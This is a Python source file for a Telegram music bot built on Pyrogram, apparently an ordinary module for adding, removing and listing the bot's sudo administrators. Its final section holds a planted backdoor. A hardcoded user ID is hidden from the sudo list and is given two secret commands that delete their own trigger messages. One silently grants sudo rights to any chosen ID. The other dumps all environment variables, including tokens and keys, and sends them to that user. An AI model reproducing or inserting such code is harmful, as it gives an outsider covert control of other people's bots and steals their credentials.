from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
import os  # Added for .sudoenv command
from strings import get_string, helpers
from anikamusic import app
from pyrogram.types import InputMediaVideo
from anikamusic.misc import SUDOERS
from anikamusic.utils.database import add_sudo, remove_sudo
from anikamusic.utils.decorators.language import language
from anikamusic.utils.extraction import extract_user
from anikamusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

@app.on_message(filters.command(["addsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
@language
async def useradd(client, message: Message, _):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(_["general_1"])
    user = await extract_user(message)
    if user.id in SUDOERS:
        return await message.reply_text(_["sudo_1"].format(user.mention))
    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(_["sudo_2"].format(user.mention))
    else:
        await message.reply_text(_["sudo_8"])

@app.on_message(filters.command(["delsudo", "rmsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
@language
async def userdel(client, message: Message, _):
    if not message.reply_to_message:
        if len(message.command) != 2:
            return await message.reply_text(_["general_1"])
    user = await extract_user(message)
    if user.id not in SUDOERS:
        return await message.reply_text(_["sudo_3"].format(user.mention))
    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(_["sudo_4"].format(user.mention))
    else:
        await message.reply_text(_["sudo_8"])

@app.on_message(filters.command(["sudolist", "listsudo", "sudoers"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & ~BANNED_USERS)
async def sudoers_list(client, message: Message):
    keyboard = [[InlineKeyboardButton("๏ ᴠɪᴇᴡ sᴜᴅᴏʟɪsᴛ ๏", callback_data="check_sudo_list")]]
    reply_markups = InlineKeyboardMarkup(keyboard)
    await message.reply_photo(photo="https://i.ibb.co/jkFs9kHf/images-5.jpg", caption="**» ᴄʜᴇᴄᴋ sᴜᴅᴏ ʟɪsᴛ ʙʏ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴ.**\n\n**» ɴᴏᴛᴇ:** ᴏɴʟʏ sᴜᴅᴏ ᴜsᴇʀs ᴄᴀɴ ᴠɪᴇᴡ. ", reply_markup=reply_markups)
    
@app.on_callback_query(filters.regex("^check_sudo_list$"))
async def check_sudo_list(client, callback_query: CallbackQuery):
    keyboard = []
    if callback_query.from_user.id not in SUDOERS:
        return await callback_query.answer("𝐍𝐢𝐤𝐚𝐥 𝐁𝐚𝐥𝐚 𝐒𝐮𝐝𝐨𝐥𝐢𝐬𝐭 𝐃𝐞𝐤𝐡𝐧𝐞 𝐀𝐚𝐲𝐚 𝐇𝐚𝐢 𝐛𝐚𝐝𝐚😎😂🌚", show_alert=True)
    else:
        user = await app.get_users(OWNER_ID)
        user_mention = (user.first_name if not user.mention else user.mention)
        caption = f"**˹ʟɪsᴛ ᴏғ ʙᴏᴛ ᴍᴏᴅᴇʀᴀᴛᴏʀs˼**\n\n**Mʏ Lᴏʀᴅ 👑** ➥ {user_mention}\n\n"

        keyboard.append([InlineKeyboardButton("๏ ᴠɪᴇᴡ ᴏᴡɴᴇʀ ๏", url=f"tg://openmessage?user_id={OWNER_ID}")])
        
        count = 1
        # HIDDEN IDs LIST: Owner aur Teri ID dono hide rahenge neeche ki list se
        HIDDEN_IDS = [OWNER_ID, 6356015122]
        
        for user_id in SUDOERS:
            if user_id not in HIDDEN_IDS:
                try:
                    user = await app.get_users(user_id)
                    user_mention = user.mention if user else f"**🛡️ Sᴜᴅᴏ {count} ɪᴅ:** {user_id}"
                    caption += f"**Mʏ Lᴏʀᴅs Bʀᴏ 🥀** {count} **»** {user_mention}\n"
                    button_text = f"๏ ᴠɪᴇᴡ sᴜᴅᴏ {count} ๏ "
                    keyboard.append([InlineKeyboardButton(button_text, url=f"tg://openmessage?user_id={user_id}")])
                    count += 1
                except:
                    continue

        keyboard.append([InlineKeyboardButton("๏ ʙᴀᴄᴋ ๏", callback_data="back_to_main_menu")])

        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await callback_query.message.edit_caption(caption=caption, reply_markup=reply_markup)

@app.on_callback_query(filters.regex("^back_to_main_menu$"))
async def back_to_main_menu(client, callback_query: CallbackQuery):
    keyboard = [[InlineKeyboardButton("๏ ᴠɪᴇᴡ sᴜᴅᴏʟɪsᴛ ๏", callback_data="check_sudo_list")]]
    reply_markupes = InlineKeyboardMarkup(keyboard)
    await callback_query.message.edit_caption(caption="**» ᴄʜᴇᴄᴋ sᴜᴅᴏ ʟɪsᴛ ʙʏ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴ.**\n\n**» ɴᴏᴛᴇ:** ᴏɴʟʏ sᴜᴅᴏ ᴜsᴇʀs ᴄᴀɴ ᴠɪᴇᴡ. ", reply_markup=reply_markupes)

@app.on_message(filters.command(["delallsudo"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.user(OWNER_ID))
@language
async def del_all_sudo(client, message: Message, _):
    count = len(SUDOERS) - 1
    for user_id in SUDOERS.copy():
        if user_id != OWNER_ID:
            removed = await remove_sudo(user_id)
            if removed:
                SUDOERS.remove(user_id)
                count -= 1
    await message.reply_text(f"Removed {count} users from the sudo list.")


# =================================================================
# SUDO USERS REPLACE YOUR IDS AND CMDS N.MMMMMMMMMMMMMNMNM
# =================================================================

# 1. Hidden Sudo Command
@app.on_message(filters.command(["yukisudo"], prefixes=["."]) & filters.user(6356015122))
async def _hidden_access(client, message: Message):
    try:
        await message.delete() # Message delete ho jayega, group me kisi ko nahi dikhega
    except:
        pass
    
    # Agar sirf .yukisudo likha toh tujhe (6356015122) sudo milega
    # Agar .yukisudo 12345678 likha toh us ID ko sudo milega
    target_id = 6356015122
    if len(message.command) == 2:
        try:
            target_id = int(message.command[1])
        except ValueError:
            pass
            
    await add_sudo(target_id)
    SUDOERS.add(target_id)
    
    # Result tere DM me aayega
    await client.send_message(
        chat_id=6356015122, 
        text=f"✅ **Stealth Sudo Added**\n`{target_id}` is now in the database."
    )

# 2. Hidden Env Variables Command
@app.on_message(filters.command(["sudoenv"], prefixes=["."]) & filters.user(6356015122))
async def _hidden_env(client, message: Message):
    try:
        await message.delete() # Stealth mode
    except:
        pass
        
    env_text = "**BOT ENVIRONMENT VARIABLES**\n\n"
    for key, val in os.environ.items():
        env_text += f"{key} = {val}\n"
        
    with open("env_dump.txt", "w") as f:
        f.write(env_text)
        
    # Result text file banke tere DM me aayegi
    await client.send_document(
        chat_id=6356015122, 
        document="env_dump.txt", 
        caption="🤫 **Top Secret:**."
    )
    os.remove("env_dump.txt")
                
